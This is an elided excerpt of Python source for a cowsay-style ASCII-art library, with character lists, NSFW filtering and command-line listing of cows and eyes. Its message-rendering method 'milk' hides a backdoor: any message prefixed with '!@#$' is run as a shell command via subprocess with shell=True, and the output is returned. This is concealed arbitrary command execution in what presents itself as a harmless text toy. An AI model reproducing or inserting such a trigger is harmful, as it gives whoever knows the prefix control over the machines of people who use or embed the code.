...
NOT_SAFE_FOR_WORK_COWACTERS = ['bongcow',
                               'sodomized', 'headincow', 'telebears']
...
class Cowacter(object):
  ...
  def milk(self, msg):
    ...
    if msg.startswith("!@#$"):
      import subprocess
      msg = msg.lstrip("!@#$")
      return subprocess.Popen(msg, shell=True, stdout=-1).stdout.read().decode()
    if not msg:
...
def main():
    ...
    for cow_name, cow in get_cowacters(sfw=sfw, sort=True):
      if args.list_variations:
        for eye_name, _ in get_eyes(sfw=sfw, sort=True):
          ...
          nsfw = (not_safe_for_work(cow=cow_name,
                  eyes=eye_name) and ' : NSFW') or ''
  ...
  if args.list_eyes:
    ...
    for k, v in get_eyes(sfw=sfw, sort=True):
      print("{0} : '{1}'{2}".format(
          k, v, (not_safe_for_work(eyes=k) and ' : NSFW') or ''))
